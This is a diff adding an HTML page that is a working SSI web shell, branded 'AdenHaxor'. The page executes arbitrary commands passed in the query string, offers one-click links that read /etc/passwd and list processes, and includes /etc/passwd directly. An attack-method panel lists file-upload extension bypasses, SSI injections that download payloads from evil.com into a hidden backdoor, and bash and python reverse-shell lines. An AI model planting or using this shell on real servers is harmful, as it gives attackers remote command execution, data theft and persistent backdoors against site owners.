@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>AdenHaxor SSI Shell</title>
+<style>
+body {
+    background: #000;
+    color: #0f0;
+    font-family: 'Courier New';
+    margin: 20px;
+}
+.header {
+    border-bottom: 2px solid #0f0;
+    padding-bottom: 10px;
+    margin-bottom: 20px;
+}
+.cmd-box {
+    background: #111;
+    border: 1px solid #0f0;
+    padding: 15px;
+    margin: 10px 0;
+}
+.input-cmd {
+    width: 70%;
+    background: black;
+    color: #0f0;
+    border: 1px solid #0f0;
+    padding: 8px;
+}
+.btn-exec {
+    background: #0f0;
+    color: black;
+    border: none;
+    padding: 8px 15px;
+    cursor: pointer;
+    font-weight: bold;
+}
+.output {
+    background: #111;
+    border: 1px solid #f00;
+    padding: 15px;
+    margin-top: 20px;
+    white-space: pre-wrap;
+    overflow-x: auto;
+}
+.methods {
+    background: #222;
+    padding: 10px;
+    margin: 15px 0;
+    border-left: 4px solid #0ff;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+<h1>AdenHaxor SSI WebShell</h1>
+<p>SSI Injection by AdenXIndonet | Mode: <span style="color:#f00;">ACTIVE</span></p>
+</div>
+
+<!--#if expr="$QUERY_STRING_METHOD" -->
+<div class="output">
+<h3>EXECUTE RESULT:</h3>
+<!--#exec cmd="$QUERY_STRING_METHOD" -->
+</div>
+<!--#endif -->
+
+<div class="methods">
+<h3>QUICK COMMANDS:</h3>
+<a href="?METHOD=id">[ID]</a> |
+<a href="?METHOD=pwd">[PWD]</a> |
+<a href="?METHOD=ls -la">[LS -LA]</a> |
+<a href="?METHOD=uname -a">[UNAME]</a> |
+<a href="?METHOD=whoami">[WHOAMI]</a> |
+<a href="?METHOD=cat /etc/passwd">[/etc/passwd]</a> |
+<a href="?METHOD=ps aux">[PROCESS]</a>
+</div>
+
+<div class="cmd-box">
+<h3>CUSTOM COMMAND:</h3>
+<form method="GET">
+<input type="text" name="METHOD" class="input-cmd" placeholder="Enter command: ls, cat, wget, curl, etc.">
+<button type="submit" class="btn-exec">EXECUTE</button>
+</form>
+</div>
+
+<div class="methods">
+<h3>🔧 METODE SERANGAN:</h3>
+<strong>1. File Upload:</strong><br>
+- Upload file .shtml/.stm<br>
+- Bypass extension: .jpg%00.shtml<br>
+- Magic bytes GIF89a; <!--#exec --><br><br>
+
+<strong>2. Direct Injection:</strong><br>
+- <!--#exec cmd="wget http://evil.com/shell.txt -O /tmp/shell" --><br>
+- <!--#exec cmd="curl -o /var/www/html/.backdoor.php http://evil.com/backdoor" --><br><br>
+
+<strong>3. Reverse Shell:</strong><br>
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" --><br>
+<!--#exec cmd="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" -->
+</div>
+
+<div class="output">
+<h3>SYSTEM INFO:</h3>
+Server: <!--#echo var="SERVER_NAME" --><br>
+Time: <!--#echo var="DATE_LOCAL" --><br>
+User: <!--#exec cmd="whoami" --><br>
+Directory: <!--#exec cmd="pwd" -->
+</div>
+
+<!--#include virtual="/etc/passwd" -->
+
+</body>
+</html>
